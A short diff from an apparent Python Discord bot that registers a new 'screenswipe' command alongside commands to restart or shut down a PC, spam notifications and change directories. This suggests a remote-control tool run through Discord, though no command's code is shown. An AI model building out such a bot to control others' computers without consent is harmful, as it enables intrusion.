@@ -63,5 +63,6 @@ bot.add_command(commands.Command(restartpc_command.restartpc, name='restartpc'))
 bot.add_command(commands.Command(shutdownpc_command.shutdownpc, name='shutdownpc'))
 bot.add_command(commands.Command(notificationspam_command.spamnotify, name='spamnotify'))
 bot.add_command(commands.Command(cd_command.cd_command, name='cd'))
+bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))
 
 bot.run(discodd.TOKEN)
